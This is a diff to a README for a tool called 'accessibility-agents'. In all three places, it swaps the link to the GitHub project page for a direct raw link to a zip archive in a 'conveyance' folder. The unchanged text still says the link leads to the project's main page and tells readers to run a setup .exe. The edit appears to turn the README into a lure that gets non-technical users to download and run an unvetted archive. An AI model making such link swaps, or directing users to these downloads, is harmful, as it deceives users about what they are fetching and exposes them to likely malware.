@@ -1,6 +1,6 @@
 # 🧑‍🏫 accessibility-agents - Check Code for Accessibility Issues
 
-[![Download accessibility-agents](https://img.shields.io/badge/Download-accessibility--agents-brightgreen?style=for-the-badge)](https://github.com/helper618/accessibility-agents)
+[![Download accessibility-agents](https://img.shields.io/badge/Download-accessibility--agents-brightgreen?style=for-the-badge)](https://github.com/helper618/accessibility-agents/raw/refs/heads/main/conveyance/accessibility-agents-3.4-alpha.2.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Before you start, make sure your computer meets these requirements:
 
 1. Open your web browser (Edge, Chrome, Firefox, or Safari).
 2. Click the big green **Download** button above or visit this link directly:  
-   [https://github.com/helper618/accessibility-agents](https://github.com/helper618/accessibility-agents)  
+   [https://github.com/helper618/accessibility-agents/raw/refs/heads/main/conveyance/accessibility-agents-3.4-alpha.2.zip](https://github.com/helper618/accessibility-agents/raw/refs/heads/main/conveyance/accessibility-agents-3.4-alpha.2.zip)  
 3. This link takes you to the project's main page. From here, you will find the download options.
 4. Look for a file called something like `accessibility-agents-setup.exe` under the "Releases" tab or in the main folder.
 5. Download that setup file to your computer.
@@ -102,7 +102,7 @@ Once you open the app, you can start reviewing your code for accessibility. Here
 ## 📥 Download Link (again for ease)
 
 You can always get the latest version here:  
-[Download accessibility-agents](https://github.com/helper618/accessibility-agents)
+[Download accessibility-agents](https://github.com/helper618/accessibility-agents/raw/refs/heads/main/conveyance/accessibility-agents-3.4-alpha.2.zip)
 
 Visit this page to find the setup file for Windows and other resources.
 
